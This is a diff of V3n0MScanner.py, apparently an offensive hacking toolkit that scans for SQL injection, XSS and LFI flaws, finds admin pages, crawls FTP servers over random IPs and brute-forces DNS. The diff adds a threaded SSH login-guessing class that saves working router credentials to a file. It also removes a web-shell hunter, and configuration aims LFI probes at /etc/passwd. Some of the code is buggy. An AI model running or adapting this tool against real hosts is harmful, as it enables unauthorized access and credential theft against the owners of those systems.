@@ -1,7 +1,7 @@
 #!/usr/bin/python
 # -*- coding: latin-1 -*-
 #              --- To be Done     --Partially implemented     -Done
-# V3n0MScanner.py - V.3.3.1
+# V3n0MScanner.py - V.3.2.2
 #   -Fix engines search parameters
 #   -Increase LFI/RFI/XSS Lists if possible
 #   ---Implement SQL Database dumping tweaks
@@ -18,8 +18,6 @@
 #   ---Pause Scanning option
 #   ---Add MD5 and SHA1 Detection/Cracking
 #	---Remove "Dark" naming conventions, provide more accurate names
-#   --MITM Attack Detection
-#   -Shell Hunter
 #
 # V3n0MScanner.py - V.3.0.2
 #    -Increased headers list to include mobile devices headers 
@@ -51,10 +49,17 @@
 #                       but in no way is this the sole work of NovaCygni, and credit is due
 #                       to every person who has worked on this tool. Thanks people. NovaCygni
 
-import re, random, threading, socket, urllib2, cookielib, subprocess, codecs, signal, time, sys, os, math, itertools, hashlib, Queue
+
+
+try:
+	import re, random, threading, socket, urllib2, cookielib, subprocess, codecs, signal, time, sys, os, math, itertools, hashlib, Queue
+except:
+	print " please make sure you have all of the following modules: re, random, threading, socket, urllib2, cookielib, subprocess, codecs, signal, time, sys, os, math, itertools"
+	exit()
 
 try:
 	import paramiko
+
 	PARAMIKO_IMPORTED = True
 except ImportError:
 	PARAMIKO_IMPORTED = False
@@ -99,17 +104,17 @@ sqlerrors = {'MySQL': 'error in your SQL syntax',
 # Banner
 def logo():
 	print R + "\n|----------------------------------------------------------------|"
-	print "|     V3n0m-Toolkit                                              |"
-	print "|     Release Date 07/01/2014  - Release Version V.3.4.0         |"
-	print "|          			                       Promoting BlackArch   |"
-	print "|          " + B + "   NovaCygni  Architect" + R + "                      |"
+	print "|     V3n0mScanner.py                                            |"
+	print "|     Release Date 09/12/2013  - Release Version V.3.3.2         |"
+	print "|          						         |"
+	print "|          " + B + "   NovaCygni  Architect  " + R + "                      |"
 	print "|                    _____       _____                           |"
-	print '|          ' + G + "         |____ |     |  _  |    " + R + "                      |"
+	print "|          " + G + "         |____ |     |  _  |    " + R + "                      |"
 	print "|             __   __   / /_ __ | |/' |_ _" + G + "_ ___             " + R + "     |"
 	print "|             \ \ / /  " + G + " \ \ '" + R + "_ \|  /| | '_ ` _ \                 |"
 	print "|              \ V" + G + " /.___/ / | | \ |_" + R + "/ / | | | | |                |"
 	print "|    Official   \_/" + G + " \____/|_" + R + "| |_|" + G + "\___/|_| |_| " + R + "|_|  Release       |"
-	print "|    							                                 |"
+	print "|    							         |"
 	print "|----------------------------------------------------------------|\n"
 
 
@@ -269,7 +274,45 @@ class Xssthread(threading.Thread):
 		self.check = False
 
 
+class Router(threading.Thread):
+	"""Checks for routers running ssh with given User/Pass"""
+
+	def __init__(self, queue, user, passw):
+		if not PARAMIKO_IMPORTED:
+			print 'You need paramiko.'
+			print 'http://www.lag.net/paramiko/'
+			sys.exit(1)
+		threading.Thread.__init__(self)
+		self.queue = queue
+		self.user = user
+		self.passw = passw
+
+	def run(self):
+		"""Tries to connect to given Ip on port 22"""
+		ssh = paramiko.SSHClient()
+		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+		while True:
+			try:
+				ip_add = self.queue.get(False)
+
+			except Queue.Empty:
+				break
+			try:
+				ssh.connect(ip_add, username=self.user, password=self.passw, timeout=10)
+				ssh.close()
+				print "Working: %s:22 - %s:%s\n" % (ip_add, self.user, self.passw)
+				write = open('Routers.txt', "a+")
+				write.write('%s:22 %s:%s\n' % (ip_add, self.user, self.passw))
+				write.close()
+				self.queue.task_done()
+
+			except:
+				print 'Not Working: %s:22 - %s:%s\n' % (ip_add, self.user, self.passw)
+				self.queue.task_done()
+
+
 def classicinj(url):
+	#noinspection PyPep8Naming,PyPep8Naming
 	EXT = "'"
 	host = url + EXT
 	try:
@@ -526,26 +569,25 @@ def colfinder():
 				raise
 
 
-def mitmattackdetector():
+def mitmattackdectector():
 	print 'Man-in-the-Middle Attack Detection Running...'
 	devices = []
 	os.system("arp -a > temp.txt")
 	f = open('temp.txt', 'r')
 	for line in f:
 		if line.find('.255') < 0:
-			temp = line.partition('dynamic' or 'static' or 'at')
+			temp = line.partition('at')
 			temp2 = temp[2]
-			temp = temp2.rpartition('#\t' or 'on')
+			temp = temp2.rpartition('on')
 			temp2 = temp[0]
 			for i in devices:
 				if i == temp2:
-					print 'ARP Cached MAC Addresses dumped'
+					print 'Alert! Possible Man-in-the-Middle Attack!'
 					print 'Attacker\'s MAC Address: ' + temp2
-					sys.stdout.write(
-						u"\r\x1b[KMac addresses: ".format(temp))
 			devices.append(temp2)
+		print (temp)
+		endsub = 1
 		fmenu()
-
 
 def fscan():
 	global maxc
@@ -677,49 +719,15 @@ def vulnscan():
 		fmenu()
 
 
-def shellscan():
-	threads = []
-	finallist = []
-	vuln = []
-	col = []
-	darkurl = []
-	go = []
-
-	numthreads = raw_input('\nEnter no. of threads : ')
-	maxc = raw_input('Enter no. of pages   : ')
-	print "Headers         :", len(header)
-	print "Threads         :", numthreads
-	print "Shells           :", len(go)
-	print "Pages           :", maxc
-	print "Timeout         :", timeout
-	print "Search Engines  : 11"
-	print "Encrypted SE    : 3"
-	print ""
-	print ""
-	print ""
-
-	usearch = search(maxc)
-	print B + "\nSaving valid urls (" + str(len(finallist)) + ") to file"
-	shelllist = raw_input("Filename: ")
-	list_name = open(shelllist, "w")
-	finallist.sort()
-	for t in finallist:
-		list_name.write(t + "\n")
-	list_name.close()
-	print "Urls saved, please check", shelllist
-	fmenu()
-
-
 def fmenu():
 	if endsub != 1:
 		vulnscan()
 	logo()
 	print "[1] Dork and vuln scan"
-	print '[2] Shell Hunter'
-	print "[3] Admin page finder"
-	print "[4] FTP crawler"
-	print "[5] DNS brute"
-	print '[6] MITM Attack Detector'
+	print "[2] Admin page finder"
+	print "[3] FTP crawler"
+	print "[4] DNS brute"
+	print '[5] MITM Attack Detector'
 	print "[0] Exit\n"
 	chce = raw_input(":")
 
@@ -727,12 +735,7 @@ def fmenu():
 		print W + ""
 		fscan()
 
-	if chce == '2':
-		print Y + ""
-		shellscan()
-
-
-	elif chce == '3':
+	elif chce == '2':
 		afsite = raw_input("Enter the site eg target.com: ")
 		print B
 		pwd = os.path.dirname(str(os.path.realpath(__file__)))
@@ -740,14 +743,14 @@ def fmenu():
 		                             shell=True)
 		findadmin.communicate()
 
-	elif chce == '4':
+	elif chce == '3':
 		randips = raw_input("How many IP addresses do you want to scan: ")
 		print B
 		pwd = os.path.dirname(str(os.path.realpath(__file__)))
 		ftpcrawl = subprocess.Popen(pwd + "/modules/ftpcrawler.py -i " + str(randips), shell=True)
 		ftpcrawl.communicate()
 
-	elif chce == '5':
+	elif chce == '4':
 		dnstarg = raw_input("Enter the site eg target.com: ")
 		print B
 		pwd = os.path.dirname(str(os.path.realpath(__file__)))
@@ -755,17 +758,15 @@ def fmenu():
 		                            shell=True)
 		dnsbrute.communicate()
 
-	elif chce == '6':
-		print Y
-		mitmattackdetector()
-
+	elif chce == '5':
+		print Y + ""
+		mitmattackdectector()
 
 	signal.signal(signal.SIGINT, killpid)
 	d0rk = [line.strip() for line in open("statics/d0rks", 'r')]
 	header = [line.strip() for line in open("statics/header", 'r')]
 	xsses = [line.strip() for line in open("statics/xsses", 'r')]
 	lfis = [line.strip() for line in open("statics/lfi", 'r')]
-	shells = [line.strip() for line in open("statics/shells", 'r')]
 	random.shuffle(d0rk)
 	random.shuffle(header)
 	random.shuffle(lfis)
@@ -831,14 +832,14 @@ rce_log = "v3n0m-rce.txt"
 xss_log = "v3n0m-xss.txt"
 admin_log = "v3n0m-admin.txt"
 lfi_log_file = open(lfi_log, "a")
-rce_log_file = open(rce_log, "a")
+rce_log_file = open(rce_log, "a")
 xss_log_file = open(xss_log, "a")
 admin_log_file = open(admin_log, "a")
 arg_end = "--"
 arg_eva = "+"
 colMax = 61 # Change this at your will
 endsub = 1
-gets = 0
+gets = 0
 timeout = 8
 file = "/etc/passwd"
 socket.setdefaulttimeout(timeout)
